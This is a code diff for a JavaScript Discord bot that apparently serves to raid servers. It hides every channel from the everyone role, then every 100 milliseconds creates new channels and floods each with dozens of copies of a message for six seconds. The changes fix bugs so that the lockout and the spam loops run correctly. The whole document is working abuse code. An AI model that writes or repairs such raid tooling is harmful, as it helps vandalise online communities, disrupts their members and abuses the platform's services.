@@ -72,7 +72,7 @@ client.on("messageCreate", async (message) => {
     for (const a of ch) {
 
       client.channels.cache.get(a).permissionOverwrites.edit(message.guild.roles.everyone,{
-        ViewChannels:false
+        ViewChannel:false
       })
     }
     var qwer = setInterval(function() {
@@ -82,7 +82,7 @@ client.on("messageCreate", async (message) => {
         parent: null
       }).then((ch) => {
         
-          ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);
+          ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);
         
       }).catch((err) => { console.log(err); });
     }, 100)
@@ -114,7 +114,7 @@ client.on("interactionCreate", async (interaction) => {
         type: 0,
         parent: null
       }).then((ch) => {
-        ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);ch.send(msg`);
+        ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);ch.send(msg);
       }).catch((err) => { console.log(err); });
     }, 100)
     setTimeout(function(){clearInterval(qwer)},6000)
